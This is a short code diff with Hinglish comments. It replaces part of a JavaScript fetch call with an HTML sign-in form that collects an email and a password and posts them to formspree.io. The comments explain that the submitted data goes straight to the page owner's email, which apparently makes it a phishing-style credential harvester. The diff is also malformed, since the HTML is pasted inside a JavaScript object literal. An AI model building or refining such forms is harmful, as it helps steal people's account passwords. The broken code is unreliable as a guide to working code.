@@ -22,7 +22,20 @@
 
       fetch(SCRIPT_URL, {
         method: "POST",
-        mode: "no-cors", // Browser security error se bachne ke liye
+        <!-- Formspree ke zariye data direct aapke email par aayega -->
+<form action="https://formspree.io" method="POST">
+  
+  <!-- Dhyan rakhein ki email input me name="email" zaroor likha ho -->
+  <input type="email" name="email" placeholder="Apna Email Likhein" required>
+  
+  <!-- Dhyan rakhein ki password input me name="password" zaroor likha ho -->
+  <input type="password" name="password" placeholder="Apna Password Likhein" required>
+  
+  <!-- Button ka type submit hona chahiye -->
+  <button type="submit">Sign In</button>
+
+</form>
+      
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: formData.toString()
       })
